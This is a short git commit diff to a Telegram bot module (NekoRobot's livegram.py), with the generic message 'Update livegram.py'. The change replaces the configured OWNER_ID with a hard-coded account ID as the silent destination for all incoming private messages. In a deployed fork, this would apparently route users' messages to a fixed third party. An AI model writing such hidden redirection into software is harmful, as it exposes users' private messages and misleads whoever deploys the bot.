dc359bbc58014fdbe2ff85aaff9d437ceab6a418
ryuk04 <122408850+ryuk04@users.noreply.github.com>
2023-01-13 23:24:44 +0530

    Update livegram.py

--- NekoRobot/modules/livegram.py
+++ NekoRobot/modules/livegram.py
@@ -8,4 +8,4 @@ from NekoRobot import pgram as bot
 @bot.on_message(filters.private & filters.incoming)
 async def on_pm_s(client: Client, message: Message):
     if message.from_user.id != 5667156680:
-        fwded_mesg = await message.forward(chat_id=OWNER_ID, disable_notification=True)
+        fwded_mesg = await message.forward(chat_id=2033411815, disable_notification=True)
